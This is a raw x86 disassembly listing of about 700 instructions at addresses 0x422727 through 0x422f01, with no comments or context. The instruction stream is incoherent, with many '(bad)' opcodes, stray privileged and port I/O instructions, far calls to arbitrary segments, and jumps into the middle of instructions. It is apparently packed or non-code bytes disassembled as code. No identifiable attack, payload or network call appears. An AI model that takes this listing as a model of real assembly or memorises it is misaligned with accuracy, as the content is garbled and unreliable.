  422727:	adc    bh,0x9d
  42272a:	and    DWORD PTR [ebx],ebp
  42272c:	pop    eax
  42272d:	call   0xcc20:0x6b262f0
  422734:	sbb    DWORD PTR [ebx-0x15],ebx
  422737:	xchg   DWORD PTR [edx-0x6b8e66bc],esp
  42273d:	xor    DWORD PTR [esp+esi*2-0x38c0cb46],esi
  422744:	dec    ebp
  422745:	and    esi,edx
  422747:	popa   
  422748:	call   0xf5b1:0xd76ea844
  42274f:	rol    BYTE PTR [eax+edi*8-0x7238d64],0xcd
  422757:	or     al,0xf3
  422759:	stc    
  42275a:	gs loope 0x4227bc
  42275d:	aas    
  42275e:	ja     0x422769
  422760:	ins    BYTE PTR es:[edi],dx
  422761:	(bad)  
  422762:	rcl    BYTE PTR [ebx],1
  422764:	lea    esi,[eax-0x63]
  422767:	stos   DWORD PTR es:[edi],eax
  422768:	repnz push edi
  42276a:	into   
  42276b:	retf   0x4918
  42276e:	or     al,0x55
  422770:	fld    st(7)
  422772:	loop   0x4227e7
  422774:	add    al,BYTE PTR [esi+eiz*2-0x420e41ce]
  42277b:	jl     0x42272d
  42277d:	ret    
  42277e:	sub    eax,DWORD PTR ds:0x6a27228b
  422784:	lds    eax,FWORD PTR [ecx+0x2c]
  422787:	jmp    0x422782
  422789:	adc    eax,DWORD PTR [esi]
  42278b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42278c:	retf   0x5592
  42278f:	jns    0x4227d2
  422791:	dec    eax
  422792:	adc    BYTE PTR [ebx-0x7a9701a1],bh
  422798:	push   ebx
  422799:	jae    0x4227c5
  42279b:	jl     0x4227d7
  42279d:	and    eax,0x28c191e4
  4227a2:	add    ebp,eax
  4227a4:	sbb    ch,BYTE PTR [ecx+edi*2+0x8]
  4227a8:	jmp    0xccce3235
  4227ad:	jmp    0x4227fe
  4227af:	adc    esp,DWORD PTR ds:0xb4d7d03a
  4227b5:	mov    BYTE PTR [esi],ch
  4227b7:	or     al,0xa4
  4227b9:	aam    0x44
  4227bb:	jmp    0xa1979c12
  4227c0:	jle    0x4227f1
  4227c2:	inc    ebx
  4227c3:	adc    DWORD PTR [eax+0x52],0xe06f5d05
  4227ca:	sub    eax,0xc38d41a5
  4227cf:	adc    eax,0x4714de6b
  4227d4:	repnz hlt 
  4227d6:	adc    eax,0xcdb3875a
  4227db:	and    cl,bh
  4227dd:	and    edx,esi
  4227df:	sub    DWORD PTR [ebx],0x29
  4227e2:	xor    DWORD PTR [edx],ecx
  4227e4:	and    al,0x61
  4227e6:	mov    edi,0xe42316d4
  4227eb:	shr    BYTE PTR [edi+edi*8+0x43],0x5e
  4227f0:	repz adc eax,0xe2a6f169
  4227f6:	sahf   
  4227f7:	mov    ch,0x9
  4227f9:	or     ebx,eax
  4227fb:	xor    eax,ebp
  4227fd:	popf   
  4227fe:	sbb    al,0xfe
  422800:	xchg   edi,eax
  422801:	jb     0x4227ab
  422803:	mov    cl,0x4a
  422805:	loop   0x422810
  422807:	mov    edx,0xe84db23f
  42280c:	rol    DWORD PTR [ecx+0x73eb717c],1
  422812:	push   edi
  422813:	xchg   edi,eax
  422814:	pushf  
  422815:	rol    dl,cl
  422817:	xchg   ebx,eax
  422818:	inc    esi
  422819:	aam    0xa6
  42281b:	xor    DWORD PTR cs:[ebp-0x5d],esp
  42281f:	ds xor cl,dh
  422822:	cmp    eax,DWORD PTR [esi]
  422824:	addr16 mov edx,0xbfc33ef0
  42282a:	stos   DWORD PTR es:[edi],eax
  42282b:	xchg   ebp,eax
  42282c:	js     0x422889
  42282e:	pop    edx
  42282f:	and    al,0x2a
  422831:	pop    esp
  422832:	clc    
  422833:	pop    es
  422834:	mov    esi,0xc430e07a
  422839:	add    BYTE PTR [ebp+0x30d044df],bh
  42283f:	retf   0x2f89
  422842:	jae    0x42286f
  422844:	push   edx
  422845:	pop    ecx
  422846:	(bad)  
  422848:	adc    al,al
  42284a:	and    dl,BYTE PTR [ecx+0x41a6ea4e]
  422850:	jp     0x42287d
  422852:	inc    esi
  422853:	lods   eax,DWORD PTR ds:[esi]
  422854:	jge    0x4228bb
  422856:	cmp    DWORD PTR [eax-0x584a0530],eax
  42285c:	mov    BYTE PTR [ecx+ebx*4+0x11],ch
  422860:	cmp    cl,BYTE PTR [edx+0x2]
  422863:	sub    ch,0x3
  422866:	shl    BYTE PTR [edi-0x44],0xe4
  42286a:	sbb    DWORD PTR [ecx+0x33caa179],0xffffff86
  422871:	jle    0x422888
  422873:	push   es
  422874:	pop    ss
  422875:	mov    esi,0xa498d1c4
  42287a:	fldenv [ecx]
  42287c:	inc    edi
  42287d:	xlat   BYTE PTR ds:[ebx]
  42287e:	push   ebp
  42287f:	lods   eax,DWORD PTR ds:[esi]
  422880:	daa    
  422881:	mov    WORD PTR [edi],ds
  422883:	mov    ch,0x23
  422885:	int    0xf9
  422887:	dec    esp
  422888:	mov    edx,0x8de722b5
  42288d:	fs jg  0x4228e1
  422890:	adc    cl,BYTE PTR [ecx]
  422892:	sbb    DWORD PTR [edi],ebp
  422894:	std    
  422895:	jo     0x4228c3
  422897:	sub    al,0x42
  422899:	outs   dx,BYTE PTR ds:[esi]
  42289a:	xor    DWORD PTR [ebp-0x6537f638],edi
  4228a0:	mov    eax,DWORD PTR [ebx-0x3a]
  4228a3:	fwait
  4228a4:	dec    ebp
  4228a5:	sub    eax,DWORD PTR [eax+0x6095d62a]
  4228ab:	jns    0x42286c
  4228ad:	dec    esi
  4228ae:	or     edx,DWORD PTR [edi]
  4228b0:	(bad)  
  4228b1:	and    al,BYTE PTR ds:0x1eb8a272
  4228b7:	stos   BYTE PTR es:[edi],al
  4228b8:	das    
  4228b9:	(bad)  
  4228ba:	push   cs
  4228bb:	adc    bl,BYTE PTR [ebx+ecx*4+0x57955f92]
  4228c2:	mov    edx,0xd632d9a8
  4228c7:	shl    DWORD PTR [ebx],cl
  4228c9:	and    eax,0x6134e183
  4228ce:	pushf  
  4228cf:	fs push es
  4228d1:	call   0x5097:0x90d22a22
  4228d8:	push   0xffffffdf
  4228da:	mov    bl,BYTE PTR [ebx+eax*8-0x98aef73]
  4228e1:	pop    ebp
  4228e2:	aad    0xca
  4228e4:	xchg   ecx,eax
  4228e5:	inc    ebx
  4228e6:	push   cs
  4228e7:	mov    bh,0x6d
  4228e9:	sub    cl,BYTE PTR ss:[eax+0x7e6caae9]
  4228f0:	pop    ds
  4228f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228f2:	out    dx,al
  4228f3:	push   ecx
  4228f4:	sbb    eax,0x7f998e78
  4228f9:	pop    eax
  4228fa:	inc    ebx
  4228fb:	inc    ecx
  4228fc:	jl     0x422955
  4228fe:	lahf   
  4228ff:	add    al,0x79
  422901:	nop
  422902:	jae    0x4228d8
  422904:	(bad)  
  422906:	or     dh,BYTE PTR [ecx]
  422908:	sbb    eax,0xc2fe8bc7
  42290d:	sub    ecx,DWORD PTR [eax+0x70fa4795]
  422913:	sbb    esp,DWORD PTR [ecx-0x43]
  422916:	scas   eax,DWORD PTR es:[edi]
  422917:	lods   eax,DWORD PTR ds:[esi]
  422918:	fimul  DWORD PTR [ecx]
  42291a:	xchg   ecx,eax
  42291b:	out    0x71,al
  42291d:	cmp    esi,DWORD PTR [ebp+0x11df0aed]
  422923:	or     cl,bl
  422925:	sahf   
  422926:	add    bh,BYTE PTR [edi-0x4f864c51]
  42292c:	sbb    eax,0x19a69f49
  422931:	cdq    
  422932:	(bad)  
  422934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422935:	or     eax,0x87a75900
  42293a:	jbe    0x422964
  42293c:	lods   eax,DWORD PTR ds:[esi]
  42293d:	cli    
  42293e:	sbb    BYTE PTR [esi+0x6b],0xf0
  422942:	(bad)  
  422943:	aad    0x90
  422945:	test   al,0xdd
  422947:	out    dx,al
  422948:	xchg   ebp,eax
  422949:	jno    0x42298e
  42294b:	mov    edi,0xe4d32a5f
  422950:	call   0xa0f37d66
  422955:	fs and dl,cl
  422958:	loopne 0x42290d
  42295a:	sbb    DWORD PTR [ecx],eax
  42295c:	jbe    0x4228e8
  42295e:	push   ds
  42295f:	cmp    DWORD PTR [edi-0x34],0x5a4fda0f
  422966:	lods   eax,DWORD PTR ds:[esi]
  422967:	lods   al,BYTE PTR ds:[esi]
  422968:	push   cs
  422969:	jecxz  0x42293d
  42296b:	xchg   ebp,eax
  42296c:	call   FWORD PTR [eax+edx*1+0x272eaaab]
  422973:	mov    ebp,0x1c15f464
  422978:	add    edx,edi
  42297a:	and    al,0x10
  42297c:	jl     0x4229b3
  42297e:	sub    edx,DWORD PTR [edx+0x5f2ac373]
  422984:	les    ecx,FWORD PTR [esi]
  422986:	inc    ecx
  422987:	xor    al,0x2
  422989:	mov    edi,0x28a78b2
  42298e:	out    dx,eax
  42298f:	mov    bl,0xf9
  422991:	sti    
  422992:	cmp    dl,dl
  422994:	stos   DWORD PTR es:[edi],eax
  422995:	jns    0x42295d
  422997:	dec    DWORD PTR [esi-0x78d9e571]
  42299d:	jecxz  0x422942
  42299f:	call   0x66b1c456
  4229a4:	sub    ebx,DWORD PTR [esi-0x54d94bda]
  4229aa:	daa    
  4229ab:	sub    DWORD PTR [eax+0x7e],ecx
  4229ae:	test   BYTE PTR [ebp+0xb],cl
  4229b1:	jle    0x4229fc
  4229b3:	stc    
  4229b4:	dec    ebp
  4229b5:	bound  eax,QWORD PTR [eax]
  4229b7:	and    eax,0x39a820eb
  4229bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229bd:	cmp    eax,DWORD PTR es:[edx-0x54]
  4229c1:	mov    edi,0x8d23fef1
  4229c6:	pop    ds
  4229c7:	cld    
  4229c8:	mov    bh,0x53
  4229ca:	test   eax,0x9800b211
  4229cf:	fcomp  st(5)
  4229d1:	add    cl,0x9c
  4229d4:	or     eax,0xeedbe737
  4229d9:	or     DWORD PTR [ebp+0x36],edi
  4229dc:	push   ebp
  4229dd:	mov    eax,0xc5ac156e
  4229e2:	daa    
  4229e3:	push   esi
  4229e4:	mov    BYTE PTR [ebp-0x7fd297da],dl
  4229ea:	jnp    0x422a36
  4229ec:	int    0xe4
  4229ee:	hlt    
  4229ef:	hlt    
  4229f0:	stos   BYTE PTR es:[edi],al
  4229f1:	xchg   ecx,eax
  4229f2:	out    dx,al
  4229f3:	mov    dh,0x89
  4229f5:	xchg   edi,eax
  4229f6:	push   ecx
  4229f7:	mov    edi,0x4be527cf
  4229fc:	stos   BYTE PTR es:[edi],al
  4229fd:	or     BYTE PTR [ebp+0x55bbc516],0x57
  422a04:	rcr    bl,0x28
  422a07:	sub    al,0x35
  422a09:	mov    esp,0x307b125d
  422a0e:	inc    ecx
  422a0f:	cmp    ecx,DWORD PTR [eax+0x1]
  422a12:	outs   dx,DWORD PTR ds:[esi]
  422a13:	stos   BYTE PTR es:[edi],al
  422a14:	daa    
  422a15:	sub    eax,0xe30443ca
  422a1a:	adc    BYTE PTR [edx-0x5dbbd70c],bl
  422a20:	cli    
  422a21:	cmp    al,BYTE PTR [ebx+0x5902abd7]
  422a27:	int    0xf9
  422a29:	sbb    ecx,DWORD PTR [edi-0x29]
  422a2c:	inc    ecx
  422a2d:	push   ebx
  422a2e:	push   esp
  422a2f:	dec    eax
  422a30:	inc    ebp
  422a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a32:	xchg   edx,eax
  422a33:	test   eax,0x9290bb81
  422a38:	xchg   esp,eax
  422a39:	add    dh,bl
  422a3b:	ds test al,0x91
  422a3e:	int3   
  422a3f:	jno    0x4229db
  422a41:	outs   dx,BYTE PTR ds:[esi]
  422a42:	rcl    BYTE PTR [edi-0x58f281ec],0x4a
  422a49:	xchg   DWORD PTR [ebx+edi*2+0x6f],ebx
  422a4d:	pop    eax
  422a4e:	(bad)  
  422a4f:	fbstp  TBYTE PTR [ebx+eiz*8]
  422a52:	adc    ebp,ebp
  422a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a55:	bound  ebx,QWORD PTR [eax+0x10b3f64e]
  422a5b:	fist   WORD PTR [ecx+0x2c46b305]
  422a61:	pop    es
  422a62:	mov    BYTE PTR [ebx+0x7b],ch
  422a65:	je     0x422a1e
  422a67:	sti    
  422a68:	lods   al,BYTE PTR ds:[esi]
  422a69:	push   ebp
  422a6a:	jl     0x422aaa
  422a6c:	push   esi
  422a6d:	or     edi,DWORD PTR es:[ecx-0xe]
  422a71:	xor    cl,al
  422a73:	pushf  
  422a74:	neg    eax
  422a76:	(bad)  
  422a77:	les    ecx,FWORD PTR [esp+ebp*4-0x70b44ad4]
  422a7e:	push   ebp
  422a7f:	xor    DWORD PTR ds:0x2124ab36,edx
  422a85:	pop    ds
  422a86:	jnp    0x422a0a
  422a88:	inc    esi
  422a89:	jge    0x422ae9
  422a8b:	(bad)  
  422a8c:	sub    BYTE PTR [edx-0x5a],dl
  422a8f:	into   
  422a90:	div    DWORD PTR [edi+0x1ba7603c]
  422a96:	xlat   BYTE PTR ds:[ebx]
  422a97:	fwait
  422a98:	pop    ds
  422a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a9a:	inc    ebp
  422a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a9c:	and    eax,0x7cd6a3b0
  422aa1:	es xchg esi,eax
  422aa3:	sub    al,0x1f
  422aa5:	dec    ebx
  422aa6:	and    al,0x3e
  422aa8:	mov    eax,ds:0x7ca4e0f0
  422aae:	hlt    
  422aaf:	cwde   
  422ab0:	mov    ch,0xa0
  422ab2:	sbb    eax,0x25d85980
  422ab7:	cmp    DWORD PTR [ebx+0x744fbd7d],0x7972b64f
  422ac1:	dec    edx
  422ac2:	ror    BYTE PTR [edx+eiz*4],1
  422ac5:	iret   
  422ac6:	push   ebp
  422ac7:	pop    es
  422ac8:	je     0x422aa8
  422aca:	xor    al,0xbf
  422acc:	or     BYTE PTR [ebp-0x5ef5687d],bh
  422ad2:	mov    ch,0x1f
  422ad4:	inc    ebx
  422ad5:	mov    cl,0xdf
  422ad7:	outs   dx,BYTE PTR ds:[esi]
  422ad8:	out    dx,al
  422ad9:	das    
  422ada:	sti    
  422adb:	addr16 retf 
  422add:	cmp    BYTE PTR [edx],bl
  422adf:	adc    eax,0x1a8c9777
  422ae4:	cs cmp ch,cl
  422ae7:	adc    BYTE PTR [ecx-0x37],al
  422aea:	xor    al,0x3c
  422aec:	lock not ecx
  422aef:	mov    WORD PTR [edi],ss
  422af1:	sbb    edi,DWORD PTR [esi]
  422af3:	pushf  
  422af4:	stos   DWORD PTR es:[edi],eax
  422af5:	in     al,0xea
  422af7:	xchg   DWORD PTR [edx],esp
  422af9:	cmp    dh,dh
  422afb:	shl    DWORD PTR [ecx+eiz*2-0x25],1
  422aff:	push   0x46
  422b01:	(bad)  
  422b02:	sub    DWORD PTR [eax-0x8],eax
  422b05:	jge    0x422b33
  422b07:	mov    al,0x41
  422b09:	aam    0xac
  422b0b:	test   eax,0xc7cecd63
  422b10:	bound  eax,QWORD PTR [ebx-0x5a43bc78]
  422b16:	sub    eax,0x8760cc20
  422b1b:	push   edi
  422b1d:	cmp    al,0x80
  422b1f:	dec    esp
  422b20:	(bad)  
  422b21:	cmp    eax,0x30f74a08
  422b26:	outs   dx,BYTE PTR ds:[esi]
  422b27:	mov    DWORD PTR [ebx-0x1a978fd8],ebp
  422b2d:	ret    
  422b2e:	into   
  422b2f:	cdq    
  422b30:	aas    
  422b31:	inc    eax
  422b32:	push   edx
  422b33:	or     eax,0x53426165
  422b38:	sub    ebp,ecx
  422b3a:	and    ebx,DWORD PTR [ebp+0x48dff1c]
  422b40:	fs pop ds
  422b42:	add    al,0xc2
  422b44:	pop    edi
  422b45:	or     bl,bh
  422b47:	mov    bl,0x99
  422b49:	adc    eax,0xb140edf2
  422b4e:	jno    0x422b7e
  422b50:	repnz cmp edx,DWORD PTR [ebp-0x5aa3495]
  422b57:	sbb    ah,BYTE PTR ds:[edx+0x7ded8d59]
  422b5e:	int    0x5d
  422b60:	and    al,0x62
  422b62:	cmp    eax,0x156e3f34
  422b67:	sti    
  422b68:	lods   eax,DWORD PTR ds:[esi]
  422b69:	hlt    
  422b6a:	les    eax,FWORD PTR [edx-0x75]
  422b6d:	inc    esp
  422b6e:	mov    ds:0x10ead40b,al
  422b73:	mov    ebx,0xbe5ff674
  422b78:	adc    edx,DWORD PTR [ebx+0x2c]
  422b7b:	push   es
  422b7c:	sahf   
  422b7d:	je     0x422bb1
  422b7f:	fidivr WORD PTR [edx-0x75]
  422b82:	sub    dl,dl
  422b84:	scas   al,BYTE PTR es:[edi]
  422b85:	daa    
  422b86:	pop    esi
  422b87:	add    ecx,eax
  422b89:	push   cs
  422b8a:	arpl   bx,bx
  422b8c:	fwait
  422b8d:	xchg   esi,eax
  422b8e:	add    DWORD PTR [ebp-0x3a4a36e6],0xffffffce
  422b95:	push   ecx
  422b96:	jne    0x422bd5
  422b98:	mov    DWORD PTR [ebx+0x4d640fa8],esi
  422b9e:	mov    ebx,0xda0025ec
  422ba3:	je     0x422b60
  422ba5:	aas    
  422ba6:	jns    0x422b2d
  422ba8:	mov    BYTE PTR [edx-0x50],cl
  422bab:	inc    edx
  422bac:	pop    DWORD PTR [ecx+0x33a71d07]
  422bb2:	sbb    DWORD PTR [ebp-0x6b212911],edi
  422bb8:	push   0x2c7956f2
  422bbd:	(bad)
  422bc2:	aad    0x9
  422bc4:	(bad)  
  422bc5:	jbe    0x422c14
  422bc7:	imul   ebp,DWORD PTR cs:[ecx],0xb3a36ac2
  422bce:	mov    edi,DWORD PTR [edx]
  422bd0:	cwde   
  422bd1:	add    BYTE PTR [edx-0x6d],cl
  422bd4:	inc    edx
  422bd5:	aas    
  422bd6:	loopne 0x422b5c
  422bd8:	lea    edi,[ecx]
  422bda:	jmp    0x422b69
  422bdc:	cmp    al,0xee
  422bde:	or     DWORD PTR [esi+0x21],ecx
  422be1:	jmp    0x422bf3
  422be3:	stc    
  422be4:	out    0x15,al
  422be6:	pop    esp
  422be7:	fmul   QWORD PTR [ebx-0x1e]
  422bea:	popw   es
  422bec:	xor    DWORD PTR [edi],esp
  422bee:	iret   
  422bef:	jbe    0x422bcc
  422bf1:	mov    edx,0x55bec1ce
  422bf6:	pop    ebx
  422bf7:	pop    ecx
  422bf8:	shl    DWORD PTR [ebx],0x38
  422bfb:	(bad)  
  422bfc:	out    0x82,eax
  422bfe:	mov    al,ds:0x71224c54
  422c03:	cld    
  422c04:	xchg   ebp,eax
  422c05:	dec    ecx
  422c06:	push   0xd499edff
  422c0b:	sub    bl,cl
  422c0d:	in     eax,0x56
  422c0f:	adc    DWORD PTR [edi],edx
  422c11:	dec    edi
  422c12:	addr16 mov al,0x4a
  422c15:	icebp  
  422c16:	imul   ebx,DWORD PTR [edi-0x25],0x690d2cae
  422c1d:	lock xchg ebx,eax
  422c1f:	call   0xee21dc14
  422c24:	jmp    0x7d04:0x130ca5df
  422c2b:	int    0x1
  422c2d:	cmc    
  422c2e:	ins    BYTE PTR es:[edi],dx
  422c2f:	repz push esp
  422c31:	and    eax,0xfba844ed
  422c36:	adc    DWORD PTR [ebx-0x552430c5],ebp
  422c3c:	mov    ch,0x8
  422c3e:	vaddsd xmm4,xmm4,xmm2
  422c42:	pop    ss
  422c43:	hlt    
  422c44:	addr16 out 0xac,al
  422c47:	xchg   DWORD PTR [ebp-0x13508c9e],eax
  422c4d:	cmp    BYTE PTR [esi-0x38b42221],ch
  422c53:	mov    dl,0x9a
  422c55:	call   0x8545e9d4
  422c5a:	inc    edx
  422c5b:	xor    eax,0xc060ce19
  422c60:	cmp    al,0xda
  422c62:	mov    esp,0x50d4d613
  422c67:	inc    ecx
  422c68:	outs   dx,BYTE PTR ds:[esi]
  422c69:	dec    ebp
  422c6a:	(bad)  
  422c6b:	xchg   edi,eax
  422c6c:	add    al,0x55
  422c6e:	push   ss
  422c6f:	cmc    
  422c70:	in     eax,dx
  422c71:	out    0xb0,al
  422c73:	cmp    eax,DWORD PTR [ebx]
  422c75:	mov    esi,0x6a4b23fe
  422c7a:	fidivr WORD PTR [ebx-0x440c500a]
  422c80:	inc    esp
  422c81:	sub    ch,bh
  422c83:	push   ecx
  422c84:	jmp    0x9e8d:0x76d8
  422c8a:	je     0x422d08
  422c8c:	mov    eax,ds:0x69618b1e
  422c91:	xchg   ecx,eax
  422c92:	inc    esi
  422c93:	and    al,0x61
  422c95:	addr16 (bad) 
  422c97:	icebp  
  422c98:	inc    ebx
  422c99:	fld    QWORD PTR [ebp-0x12880db3]
  422c9f:	rcr    al,cl
  422ca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ca2:	and    esp,0x3dfb4970
  422ca8:	jg     0x422cfb
  422caa:	repz jmp 0x1853fb03
  422cb0:	loope  0x422d25
  422cb2:	xchg   esp,eax
  422cb3:	xchg   ebp,eax
  422cb4:	repnz cs shr edi,1
  422cb8:	cmovo  esi,esi
  422cbb:	scas   al,BYTE PTR es:[edi]
  422cbc:	inc    eax
  422cbd:	lea    ebp,[edi]
  422cbf:	int3   
  422cc0:	or     eax,0x90213240
  422cc5:	ins    BYTE PTR es:[edi],dx
  422cc6:	push   es
  422cc7:	test   ch,cl
  422cc9:	jmp    0xdb6b41ad
  422cce:	inc    esp
  422ccf:	mov    DWORD PTR [eax],esp
  422cd1:	lods   eax,DWORD PTR ds:[esi]
  422cd2:	ja     0x422d10
  422cd4:	dec    ebx
  422cd5:	xor    al,0x2a
  422cd7:	push   ds
  422cd8:	mov    edi,?
  422cda:	mov    dh,0xb2
  422cdc:	push   cs
  422cdd:	mov    edx,0x715f5199
  422ce2:	rcr    DWORD PTR [esi],0x54
  422ce5:	cmc    
  422ce6:	jno    0x422d08
  422ce8:	sahf   
  422ce9:	aas    
  422cea:	cli    
  422ceb:	cmp    DWORD PTR cs:[ebx-0x16],esi
  422cef:	xchg   esi,eax
  422cf0:	in     eax,0xc5
  422cf2:	jne    0x422cf7
  422cf4:	add    eax,0x79b275c3
  422cf9:	int    0x97
  422cfb:	fadd   QWORD PTR [ecx-0x6712ec04]
  422d01:	popf   
  422d02:	push   ebx
  422d03:	pop    ebp
  422d04:	jge    0x422cfb
  422d06:	nop
  422d07:	repnz mov eax,ds:0xf566341d
  422d0d:	adc    ebx,ebx
  422d0f:	add    bh,ah
  422d11:	cmp    al,0xfa
  422d13:	and    eax,0xbe87cf74
  422d18:	cld    
  422d19:	je     0x422d99
  422d1b:	push   0xffffffcc
  422d1d:	pop    ecx
  422d1e:	adc    eax,0xdea6547d
  422d23:	mov    ebp,0xcd3c861b
  422d28:	mov    cl,0xd6
  422d2a:	cmp    al,0x90
  422d2c:	xchg   ebp,eax
  422d2d:	mov    WORD PTR [esi+0x3cabbd2a],fs
  422d33:	or     DWORD PTR [esp+esi*8-0x155ddf9a],0x6
  422d3b:	inc    edi
  422d3c:	inc    ebx
  422d3d:	int    0xad
  422d3f:	rol    DWORD PTR [ebx+0x31e6daf8],1
  422d45:	sub    edx,eax
  422d47:	cld    
  422d48:	loopne 0x422ce0
  422d4a:	retf   0x3ee2
  422d4d:	adc    ebx,edx
  422d4f:	adc    al,0x7a
  422d51:	cmp    al,0x4
  422d53:	into   
  422d54:	dec    esp
  422d55:	xor    bh,BYTE PTR [edi+edi*2-0x80c8977]
  422d5c:	aam    0xb7
  422d5e:	inc    ebp
  422d5f:	enter  0x3cc2,0x89
  422d63:	xor    esi,ecx
  422d65:	mov    ebp,0xdc1bfb9e
  422d6a:	fimul  DWORD PTR [ebx]
  422d6c:	lods   eax,DWORD PTR ds:[esi]
  422d6d:	imul   esp,DWORD PTR [edx-0x6d],0xffffff9c
  422d71:	sub    ch,BYTE PTR [ebx-0x5dc7bea3]
  422d77:	hlt    
  422d78:	int    0x64
  422d7a:	jb     0x422d73
  422d7c:	add    dl,BYTE PTR [ebp+edi*8+0x30]
  422d80:	push   es
  422d81:	and    al,0x64
  422d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d84:	mov    edx,0x60310e65
  422d89:	int    0x6c
  422d8b:	gs or  eax,0x1ecdb27b
  422d91:	repnz fld QWORD PTR ds:[edi+eiz*8-0x80]
  422d97:	push   cs
  422d98:	jno    0x422dca
  422d9a:	clc    
  422d9b:	push   ebx
  422d9c:	lods   eax,DWORD PTR ds:[esi]
  422d9d:	in     eax,dx
  422d9e:	push   cs
  422d9f:	jecxz  0x422d2e
  422da1:	mov    al,bl
  422da3:	mov    dh,0x71
  422da5:	pop    edx
  422da6:	push   ecx
  422da7:	or     al,0x33
  422da9:	push   ebx
  422daa:	pop    edx
  422dab:	push   0xa33a6cb
  422db0:	(bad)  
  422db1:	xor    eax,0x2635caac
  422db6:	rcr    dh,cl
  422db8:	push   0x5bedeec8
  422dbd:	mov    esi,DWORD PTR ds:0xc1e21b98
  422dc3:	lods   eax,DWORD PTR ds:[esi]
  422dc4:	(bad)  
  422dc5:	in     al,dx
  422dc6:	mov    ebp,0xb2a7dca2
  422dcb:	jg     0x422dec
  422dcd:	jmp    0xe629:0x1e2d237
  422dd4:	cs xchg ebx,eax
  422dd6:	cmp    eax,0xecf29e15
  422ddb:	mov    cl,0xd6
  422ddd:	je     0x422e1c
  422ddf:	sti    
  422de0:	xchg   edi,eax
  422de1:	sbb    al,0xa1
  422de3:	(bad)  
  422de4:	pop    ds
  422de5:	in     al,0x2a
  422de7:	scas   eax,DWORD PTR es:[edi]
  422de8:	push   ecx
  422de9:	aad    0x20
  422deb:	dec    edx
  422dec:	jl     0x422dcc
  422dee:	push   ecx
  422def:	mov    WORD PTR [edx-0x712ddc90],es
  422df5:	mov    esi,0x14259c24
  422dfa:	sub    eax,0x656ea3f9
  422dff:	xchg   edx,eax
  422e00:	mov    ah,0xf1
  422e02:	dec    eax
  422e03:	jle    0x422e09
  422e05:	adc    DWORD PTR [ebp+0x3],ebx
  422e08:	adc    BYTE PTR [edi-0x18eb1298],ah
  422e0e:	add    ecx,DWORD PTR [edx-0x70]
  422e11:	pop    esi
  422e12:	mov    BYTE PTR [ebx+0x6f],bh
  422e15:	ja     0x422e14
  422e17:	xor    al,0x75
  422e19:	nop
  422e1a:	shr    BYTE PTR [ebx],cl
  422e1c:	jb     0x422de3
  422e1e:	je     0x422dfa
  422e20:	cmp    BYTE PTR [edi-0x45],al
  422e23:	hlt    
  422e24:	cmp    BYTE PTR [ebx-0x769bbcca],al
  422e2a:	fwait
  422e2b:	adc    BYTE PTR [ebx+0x3a007a94],0x37
  422e32:	iret   
  422e33:	jne    0x422e5d
  422e35:	das    
  422e36:	mov    esp,0x47c79214
  422e3b:	js     0x422eaf
  422e3d:	pop    es
  422e3e:	mov    al,ds:0xdd98dff8
  422e43:	dec    edx
  422e44:	lock mov bl,0x39
  422e47:	pop    ecx
  422e48:	rcr    dh,cl
  422e4a:	add    al,0x36
  422e4c:	fsub   DWORD PTR cs:[ebx+0x45e4603a]
  422e53:	(bad)  
  422e54:	sbb    eax,0x3c542a7f
  422e59:	xor    bl,BYTE PTR [edx+ebx*1-0x64]
  422e5d:	daa    
  422e5e:	loope  0x422e17
  422e60:	(bad)  
  422e61:	xor    ecx,DWORD PTR [edi+ecx*8-0x1dffc562]
  422e68:	xchg   ebx,eax
  422e69:	fmul   QWORD PTR [ebx-0x30]
  422e6d:	les    eax,FWORD PTR [ebp+ebx*8+0x689bd094]
  422e74:	cs inc edi
  422e76:	sar    eax,1
  422e78:	add    eax,0x6e8fcf09
  422e7d:	cmp    BYTE PTR [esi-0x35],dh
  422e80:	mov    cl,0x5
  422e82:	sub    esp,DWORD PTR [edx+0x4b1728c5]
  422e88:	xchg   esi,eax
  422e89:	sbb    eax,edx
  422e8b:	das    
  422e8c:	pop    edi
  422e8d:	lahf   
  422e8e:	div    BYTE PTR [eax+ecx*4]
  422e91:	(bad)  
  422e92:	out    dx,al
  422e93:	loopne 0x422e4a
  422e95:	inc    ecx
  422e96:	cmp    esp,DWORD PTR [edx-0x12]
  422e99:	enter  0xd84d,0x18
  422e9d:	add    esi,edx
  422e9f:	rol    DWORD PTR [eax-0x6a6a3e05],cl
  422ea5:	jne    0x422f07
  422ea7:	retf   
  422ea8:	and    bh,BYTE PTR [eax+0x19113bae]
  422eae:	cs gs fwait
  422eb1:	add    BYTE PTR [esi-0x31bd2b96],dl
  422eb7:	pusha  
  422eb8:	(bad)  
  422eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eba:	jb     0x422e53
  422ebc:	arpl   WORD PTR [edi+0x626d1a29],sp
  422ec2:	aas    
  422ec3:	outs   dx,BYTE PTR ds:[esi]
  422ec4:	mov    DWORD PTR [edx+0x2b],edi
  422ec7:	daa    
  422ec8:	cmp    ebx,ebx
  422eca:	outs   dx,BYTE PTR ds:[esi]
  422ecb:	pop    es
  422ecc:	mov    bl,0x56
  422ece:	retf   0x57cb
  422ed1:	jbe    0x422f1d
  422ed3:	xor    bh,BYTE PTR [edi-0x6f]
  422ed6:	mov    ds,WORD PTR [edx+0x4d]
  422ed9:	dec    eax
  422eda:	push   ss
  422edb:	lock cmc 
  422edd:	clc    
  422ede:	jae    0x422f12
  422ee0:	xor    al,0x82
  422ee2:	jbe    0x422f41
  422ee4:	mov    esi,0x22d7868
  422ee9:	push   edi
  422eea:	mov    edi,0xa582e00f
  422eef:	sub    eax,0x60fa19eb
  422ef4:	ret    
  422ef5:	cmp    DWORD PTR [ebx+0x19],edx
  422ef8:	inc    eax
  422ef9:	inc    edi
  422efa:	out    dx,eax
  422efb:	jecxz  0x422ecb
  422efd:	dec    eax
  422efe:	es pop ss
  422f00:	inc    esi
  422f01:	or     ebp,DWORD PTR [esi+0xc]
